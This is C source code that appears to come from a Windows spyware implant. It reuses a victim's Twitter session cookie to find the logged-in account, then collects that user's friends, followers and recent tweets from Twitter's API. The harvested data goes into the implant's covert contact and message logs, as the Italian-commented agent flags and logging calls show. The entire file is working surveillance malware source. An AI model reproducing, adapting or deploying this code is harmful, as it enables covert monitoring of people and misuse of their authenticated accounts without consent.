#include <windows.h>
#include <stdio.h>
#include <time.h>
#include "..\common.h"
#include "..\LOG.h"
#include "SocialMain.h"
#include "NetworkHandler.h"

extern BOOL bPM_IMStarted; // variabili per vedere se gli agenti interessati sono attivi
extern BOOL bPM_ContactsStarted; 
extern BOOL bPM_MailCapStarted;

extern DWORD GetLastFBTstamp(char *user, DWORD *hi_part);
extern void SetLastFBTstamp(char *user, DWORD tstamp_lo, DWORD tstamp_hi);
extern BOOL DumpContact(HANDLE hfile, WCHAR *name, WCHAR *email, WCHAR *company, WCHAR *addr_home, WCHAR *addr_office, WCHAR *phone_off, WCHAR *phone_mob, WCHAR *phone_hom, WCHAR *skype_name, WCHAR *facebook_page);
extern wchar_t *UTF8_2_UTF16(char *str); // in firefox.cpp

#define TW_CONTACT_ID1 "\"screen_name\":\""
#define TW_CONTACT_ID2 "\"name\":\""

DWORD ParseCategory(char *user, char *category, char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char cursor[512];
	WCHAR twitter_request[256];
	char contact_name[256];
	char screen_name[256];
	HANDLE hfile;
	WCHAR *screen_name_w, *contact_name_w;

	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/%S/ids.json?cursor=-1&user_id=%S", category, user);
	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;
	
	cursor[0] = 0;
	parser1 = (char *)strstr((char *)r_buffer, "\"ids\":[");
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen("\"ids\":[");
	parser2 = (char *)strchr((char *)parser1, ',');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	strcat_s(cursor, (char *)parser1);
	strcat_s(cursor, "%2C");
	parser1 = parser2 + 1; 
	parser2 = (char *)strchr((char *)parser1, ',');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	strcat_s(cursor, (char *)parser1);
	strcat_s(cursor, "%2C");
	parser1 = parser2 + 1; 
	parser2 = (char *)strchr((char *)parser1, ']');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	strcat_s(cursor, (char *)parser1);
	SAFE_FREE(r_buffer);

	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/users/lookup.json?user_id=%S&screen_name=", cursor);
	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	
	hfile = Log_CreateFile(PM_CONTACTSAGENT, NULL, 0);
	for (;;) {
		parser1 = strstr(parser1, TW_CONTACT_ID1);
		if (!parser1)
			break;
		parser1 += strlen(TW_CONTACT_ID1);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, TW_CONTACT_ID2);
		if (!parser1)
			break;
		parser1 += strlen(TW_CONTACT_ID2);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(contact_name, sizeof(contact_name), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		contact_name_w = UTF8_2_UTF16(contact_name);
		screen_name_w = UTF8_2_UTF16(screen_name);

		DumpContact(hfile, screen_name_w, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, contact_name_w);
		
		SAFE_FREE(contact_name_w);
		SAFE_FREE(screen_name_w);
	}
	Log_CloseFile(hfile);

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD HandleTwitterContacts(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char user[256];
	static BOOL scanned = FALSE;

	CheckProcessStatus();

	if (!bPM_ContactsStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	if (scanned)
		return SOCIAL_REQUEST_SUCCESS;

	// Identifica l'utente
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)strstr((char *)r_buffer, "data-user-id=\"");
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen("data-user-id=\"");
	parser2 = (char *)strchr((char *)parser1, '\"');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
	SAFE_FREE(r_buffer);
	scanned = TRUE;

	ParseCategory(user, "friends", cookie);
	return ParseCategory(user, "followers", cookie);
}

#define TW_TWEET_BODY "\"text\":\""
#define TW_TWEET_ID "\"id_str\":\""
DWORD ParseTweet(char *user, char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	WCHAR twitter_request[256];
	char tweet_body[256];
	char tweet_id[256];
	char screen_name[256];
	WCHAR *tweet_body_w;
	ULARGE_INTEGER act_tstamp;
	DWORD last_tstamp_hi, last_tstamp_lo;
	struct tm tstamp;

	last_tstamp_lo = GetLastFBTstamp(user, &last_tstamp_hi);

	_snwprintf_s(twitter_request, sizeof(twitter_request)/sizeof(WCHAR), _TRUNCATE, L"/1/statuses/user_timeline.json?user_id=%S", user);
	ret_val = HttpSocialRequest(L"api.twitter.com", L"GET", twitter_request, 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	
	for (;;) {

		parser1 = strstr(parser1, TW_TWEET_ID);
		if (!parser1)
			break;
		parser1 += strlen(TW_TWEET_ID);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(tweet_id, sizeof(tweet_id), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		if (!atoi(tweet_id))
			continue;
		// Verifica se e' gia' stato preso
		sscanf_s(tweet_id, "%llu", &act_tstamp);
		if (act_tstamp.HighPart < last_tstamp_hi)
			break;
		if (act_tstamp.HighPart==last_tstamp_hi && act_tstamp.LowPart<=last_tstamp_lo)
			break;
		SetLastFBTstamp(user, act_tstamp.LowPart, act_tstamp.HighPart);

		parser1 = strstr(parser1, TW_TWEET_BODY);
		if (!parser1)
			break;
		parser1 += strlen(TW_TWEET_BODY);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(tweet_body, sizeof(tweet_body), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		parser1 = strstr(parser1, TW_CONTACT_ID1);
		if (!parser1)
			break;
		parser1 += strlen(TW_CONTACT_ID1);
		parser2 = strchr(parser1, '\"');
		if (!parser2)
			break;
		*parser2 = NULL;
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

		// XXX Sistemare il timestamp
		LogSocialIMMessageA("Twitter", "", "", screen_name, tweet_body, &tstamp); 	
	}

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD HandleTwitterTweets(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char user[256];

	CheckProcessStatus();

	if (!bPM_IMStarted)
		return SOCIAL_REQUEST_NETWORK_PROBLEM;

	// Identifica l'utente
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)strstr((char *)r_buffer, "data-user-id=\"");
	if (!parser1) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser1 += strlen("data-user-id=\"");
	parser2 = (char *)strchr((char *)parser1, '\"');
	if (!parser2) {
		SAFE_FREE(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	*parser2=0;
	_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
	SAFE_FREE(r_buffer);

	return ParseTweet(user, cookie);
}